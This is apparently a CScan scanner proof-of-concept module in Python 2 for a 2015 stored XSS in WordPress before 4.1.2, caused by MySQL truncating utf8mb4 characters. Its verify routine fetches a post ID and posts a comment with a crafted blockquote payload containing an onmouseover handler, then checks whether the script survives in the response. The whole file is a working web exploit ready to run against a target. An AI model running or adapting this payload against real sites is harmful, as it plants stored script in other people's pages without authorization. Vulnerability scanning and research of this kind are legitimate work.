# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random
import string
import requests


class Vuln(ABVuln):
    vuln_id = 'WordPress_0007'  # 平台漏洞编号，留空
    name = 'WordPress 存储型XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-04-21'  # 漏洞公布时间
    desc = '''
        该问题由 mysql 的一个特性引起，在 mysql 的 utf8 字符集中，一个字符由1~3个字节组成，
        对于大于3个字节的字符，mysql 使用了 utf8mb4 的形式来存储。
        如果我们将一个 utf8mb4 字符插入到 utf8 编码的列中，那么在mysql的非strict mode下，
        他会将后面的内容截断，导致我们可以利用这一缺陷完成 XSS 攻击。
    '''  # 漏洞描述
    ref = 'https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = '<4.1.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4c5a9c87-e387-48f8-8573-a4226f35897d'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = self.target + "/wp-comments-post.php"

            def rand_str(length): return ''.join(
                random.sample(string.letters, length))

            post_id = ''
            try:
                post_id = re.search(r'post-(?P<post_id>[\d]+)',
                                    requests.get(self.target).content)
                if post_id:
                    post_id = post_id.group('post_id')
            except Exception, e:
                self.output.info('执行异常{}'.format(e))

            ttys = "test<blockquote cite='%s onmouseover=alert(1)// \xD8\x34\xDF\x06'>"
            flag = rand_str(10)
            payload = {
                'author': rand_str(10),
                'email': '%s@%s.com' % (rand_str(10), rand_str(3)),
                'url': 'http://www.cscan.cn',
                'comment': ttys % flag,
                'comment_post_ID': post_id,
                'comment_parent': 0,
            }
            content = requests.post(verify_url, data=payload).content
            if '<blockquote cite=&#8217;%s onmouseover=alert(1)' % flag in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
